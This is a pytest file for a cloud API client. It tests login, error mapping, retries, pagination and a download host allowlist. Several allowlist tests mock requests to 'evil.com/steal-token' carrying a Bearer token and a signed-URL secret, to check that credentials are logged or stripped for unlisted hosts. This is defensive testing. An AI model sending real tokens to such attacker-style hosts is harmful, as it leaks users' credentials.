"""Cloud client: retry, circuit breaker, error mapping."""
from __future__ import annotations

import httpx
import pytest
import respx
import structlog

from backend.clients.ndi_cloud import NdiCloudClient
from backend.errors import (
    AuthInvalidCredentials,
    BulkFetchTooLarge,
    CloudTimeout,
    CloudUnreachable,
    Forbidden,
    NotFound,
    QueryInvalidNegation,
)


@pytest.mark.asyncio
async def test_login_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/login").respond(
            200, json={"token": "jwt-abc", "user": {"id": "u1", "email": "a@b"}},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            result = await client.login("a@b", "pw")
            assert result.access_token == "jwt-abc"
            assert result.user == {"id": "u1", "email": "a@b"}
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_login_invalid_credentials() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/login").respond(401, json={"errors": "Unable to login"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(AuthInvalidCredentials):
                await client.login("a@b", "wrong")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_get_dataset_404_maps_to_not_found() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/xxx").respond(404, json={"error": "not found"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(NotFound):
                await client.get_dataset("xxx")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_get_dataset_403_maps_to_forbidden() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/yyy").respond(403, json={"error": "forbidden"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(Forbidden):
                await client.get_dataset("yyy")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_bulk_fetch_rejects_over_500_ids() -> None:
    client = NdiCloudClient()
    await client.start()
    try:
        with pytest.raises(BulkFetchTooLarge):
            await client.bulk_fetch("d1", ["abc"] * 501)
    finally:
        await client.close()


@pytest.mark.asyncio
async def test_retry_on_5xx() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        call_count = 0

        def handler(request: httpx.Request) -> httpx.Response:
            nonlocal call_count
            call_count += 1
            if call_count < 2:
                return httpx.Response(503)
            return httpx.Response(200, json={"name": "ok"})

        router.get("/datasets/retry-test").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            result = await client.get_dataset("retry-test")
            assert result == {"name": "ok"}
            assert call_count == 2
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_cloud_timeout_raises_typed() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/slow").mock(side_effect=httpx.TimeoutException("timeout"))
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudTimeout):
                await client.get_dataset("slow")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_network_error_raises_cloud_unreachable() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/gone").mock(side_effect=httpx.ConnectError("refused"))
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudUnreachable):
                await client.get_dataset("gone")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_ndiquery_paginates() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        def handler(request: httpx.Request) -> httpx.Response:
            page = int(request.url.params.get("page", "1"))
            # 1500 total docs; pages of size 1000.
            if page == 1:
                docs = [{"id": f"d{i}"} for i in range(1000)]
            elif page == 2:
                docs = [{"id": f"d{i}"} for i in range(1000, 1500)]
            else:
                docs = []
            return httpx.Response(200, json={
                "documents": docs, "number_matches": 1500, "page": page, "pageSize": 1000,
            })
        router.post("/ndiquery").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            body = await client.ndiquery(
                searchstructure=[{"operation": "isa", "param1": "subject"}],
                scope="public",
            )
            assert len(body["documents"]) == 1500
            assert body["totalItems"] == 1500
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_ndiquery_invalid_negation_maps_typed() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/ndiquery").respond(400, json={"error": "~or is not allowed"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(QueryInvalidNegation):
                await client.ndiquery(
                    searchstructure=[{"operation": "~or", "param1": [], "param2": []}],
                    scope="public",
                )
        finally:
            await client.close()


# ---------------------------------------------------------------------------
# download_file host allowlist (PR-6)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_download_from_allowlisted_host_sends_bearer() -> None:
    """Phase-agnostic: if the host is on the allowlist, Authorization is sent."""
    captured: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization", "")
        return httpx.Response(200, content=b"FILE_BYTES")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://mybucket.s3.amazonaws.com/path/file.nbf").mock(
            side_effect=handler,
        )
        client = NdiCloudClient()
        await client.start()
        try:
            body = await client.download_file(
                "https://mybucket.s3.amazonaws.com/path/file.nbf",
                access_token="jwt-abc",
            )
            assert body == b"FILE_BYTES"
            assert captured["authorization"] == "Bearer jwt-abc"
        finally:
            await client.close()


def _settings_with_enforce(enforce: bool):
    """Build a fresh Settings instance with the enforce flag set.

    Doesn't touch the cached module-level singleton — we pass the settings to
    NdiCloudClient explicitly. conftest.py sets the required env vars so
    `Settings()` picks them up from the environment.
    """
    from backend.config import Settings

    return Settings(DOWNLOAD_ALLOWLIST_ENFORCE=enforce)  # type: ignore[call-arg]


@pytest.mark.asyncio
async def test_download_from_off_allowlist_host_logs_warning_phase1() -> None:
    """Phase 1 (enforce=False): Authorization still forwarded, warning logged."""
    captured: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization", "")
        return httpx.Response(200, content=b"EVIL")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://evil.com/steal-token").mock(side_effect=handler)
        client = NdiCloudClient(settings=_settings_with_enforce(False))
        await client.start()
        try:
            with structlog.testing.capture_logs() as logs:
                body = await client.download_file(
                    "https://evil.com/steal-token?X-Amz-Signature=SECRET",
                    access_token="jwt-abc",
                )
            assert body == b"EVIL"
            # Phase-1: Authorization header STILL forwarded (we observe only).
            assert captured["authorization"] == "Bearer jwt-abc"
            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
            assert events, f"expected off_allowlist_host warning, got {logs}"
            assert events[0]["host"] == "evil.com"
            assert events[0]["enforce"] is False
            # url_pattern in log must NOT leak the signed-URL query.
            assert "X-Amz-Signature" not in events[0]["url_pattern"]
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_from_off_allowlist_host_strips_auth_phase2() -> None:
    """Phase 2 (enforce=True): Authorization stripped; warning still logged."""
    captured: dict[str, str | None] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization")
        return httpx.Response(200, content=b"NOT_SENT")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://evil.com/steal-token").mock(side_effect=handler)
        client = NdiCloudClient(settings=_settings_with_enforce(True))
        await client.start()
        try:
            with structlog.testing.capture_logs() as logs:
                body = await client.download_file(
                    "https://evil.com/steal-token",
                    access_token="jwt-abc",
                )
            assert body == b"NOT_SENT"
            # Phase-2: Authorization header MUST be absent.
            assert captured["authorization"] is None
            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
            assert events, f"expected off_allowlist_host warning, got {logs}"
            assert events[0]["enforce"] is True
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_without_token_on_off_allowlist_host_sends_no_auth() -> None:
    """No token passed + non-allowlisted host: request goes out with no auth,
    regardless of enforce flag (nothing to strip)."""
    captured: dict[str, str | None] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization")
        return httpx.Response(200, content=b"OK")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://evil.com/file").mock(side_effect=handler)
        client = NdiCloudClient(settings=_settings_with_enforce(True))
        await client.start()
        try:
            body = await client.download_file("https://evil.com/file")
            assert body == b"OK"
            assert captured["authorization"] is None
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_from_cloud_host_always_allowlisted() -> None:
    """Cloud host (from NDI_CLOUD_URL) is added to the runtime allowlist
    dynamically — Bearer is forwarded without a warning."""
    captured: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization", "")
        return httpx.Response(200, content=b"INTERNAL")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://api.example.test/internal/file").mock(side_effect=handler)
        client = NdiCloudClient(settings=_settings_with_enforce(True))
        await client.start()
        try:
            with structlog.testing.capture_logs() as logs:
                body = await client.download_file(
                    "https://api.example.test/internal/file",
                    access_token="jwt-abc",
                )
            assert body == b"INTERNAL"
            assert captured["authorization"] == "Bearer jwt-abc"
            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
            assert not events, "cloud host should not log the off-allowlist warning"
        finally:
            await client.close()
